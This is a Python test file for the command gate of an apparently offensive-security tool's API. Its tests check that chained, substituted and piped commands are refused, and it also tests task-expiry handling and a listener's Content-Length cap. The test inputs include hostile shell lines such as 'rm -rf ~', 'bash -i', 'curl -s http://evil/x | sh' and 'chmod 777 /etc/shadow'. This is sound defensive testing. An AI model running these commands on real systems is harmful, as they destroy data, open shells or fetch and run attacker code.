"""Regression tests for the fresh-audit security sweep.

Locks in the fixes for:

  * the API backend command gate — EVERY shell segment is validated, not
    just the leading binary (`nmap x; rm -rf ~` used to pass);
  * command substitution (`$()`, backticks) is refused outright;
  * TypedTask expiry accepts mixed wire types without crashing the policy
    (unparseable deadline = expired, never a TypeError);
  * the tracker listener caps Content-Length instead of reading whatever a
    stranger claims.
"""
import shlex

import pytest

from phantom.api.server import (
    _check_segment_token,
    _split_shell_segments,
    _validate_backend_command,
)
from phantom.core.task_policy import TypedTask, policy


# ── API backend command gate ────────────────────────────────────────────────

@pytest.mark.parametrize("module,command", [
    # legitimate module commands must keep working
    ("scan", "nmap -sV 10.0.0.5"),
    ("web", "curl -s http://10.0.0.5/ | grep -o 'Server: .*'"),
    ("exploit", "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; "
                "set RHOSTS 10.0.0.5; run; exit\""),
    (None, "nmap -sV 10.0.0.5"),
])
def test_legit_commands_still_allowed(module, command):
    assert _validate_backend_command(module, command) is None


@pytest.mark.parametrize("command", [
    "nmap 10.0.0.5; rm -rf ~",
    "nmap 10.0.0.5 && bash -i",
    "nmap 10.0.0.5; python -c 'import os'",
    "nmap 10.0.0.5\nrm -rf /",
    "nmap 10.0.0.5; chmod 777 /etc/shadow",
    "nmap 10.0.0.5; curl -s http://evil/x | sh",
])
def test_smuggled_second_command_blocked(command):
    assert _validate_backend_command("scan", command) is not None


@pytest.mark.parametrize("command", [
    "nmap $(curl -s evil.sh)",
    "nmap `id`",
    "nmap ${HOME}",
])
def test_command_substitution_blocked(command):
    err = _validate_backend_command("scan", command)
    assert err and "substitution" in err


def test_pipe_into_interpreter_blocked():
    err = _validate_backend_command("scan", "curl -s evil.sh | sh")
    assert err and "interpreter" in err


def test_generic_endpoint_uses_global_allowlist():
    assert _validate_backend_command(None, "rm -rf /") is not None
    assert _validate_backend_command(None, "id") is None


# ── segment splitter ───────────────────────────────────────────────────────

def test_quoted_separators_are_not_segment_boundaries():
    cmd = 'msfconsole -q -x "use a; run; exit"'
    assert _split_shell_segments(cmd) == [cmd]


def test_unquoted_separators_split():
    assert _split_shell_segments("a; b && c | d") == ["a", "b", "c", "d"]


def test_segment_token_check_reports_cli_only():
    # `run` is a do_* shell method, not a shell binary
    assert "CLI-only" in (_check_segment_token("exploit", "run") or "")


# ── TypedTask expiry robustness ─────────────────────────────────────────────

def test_expiry_accepts_iso_string_and_epoch():
    p = policy()
    p.set_grants("B-EXP", ["shell"])
    assert p.check_typed("B-EXP", TypedTask(
        capability_id="shell", args=["id"],
        expires_at="2001-01-01T00:00:00Z", task_id="t1")).allowed is False
    assert p.check_typed("B-EXP", TypedTask(
        capability_id="shell", args=["id"],
        expires_at=1, task_id="t2")).allowed is False
    assert p.check_typed("B-EXP", TypedTask(
        capability_id="shell", args=["id"],
        expires_at=9999999999, task_id="t3")).allowed is True
    # an unparseable deadline fails CLOSED
    assert p.check_typed("B-EXP", TypedTask(
        capability_id="shell", args=["id"],
        expires_at="not-a-date", task_id="t4")).allowed is False


def test_policy_denies_ungranted_capability():
    p = policy()
    p.set_grants("B-GRANT", ["shell"])
    assert p.check_legacy("B-GRANT", "inject pid=1").allowed is False
    assert p.check_legacy("B-GRANT", "shell whoami").allowed is True


# ── tracker listener hardening ──────────────────────────────────────────────

def test_tracker_body_length_is_capped():
    """The listener must clamp Content-Length rather than trust it."""
    import inspect
    from phantom.automation.social import tracker as T
    src = inspect.getsource(T)
    # both POST paths read the header through min(int(...), 64 * 1024)
    assert src.count("64 * 1024") >= 2
    assert src.count("min(int(") >= 2


def test_tracker_rejects_bogus_content_length():
    """int() on garbage must not raise out of the handler."""
    import inspect
    from phantom.automation.social import tracker as T
    src = inspect.getsource(T)
    assert src.count("except (TypeError, ValueError)") >= 2
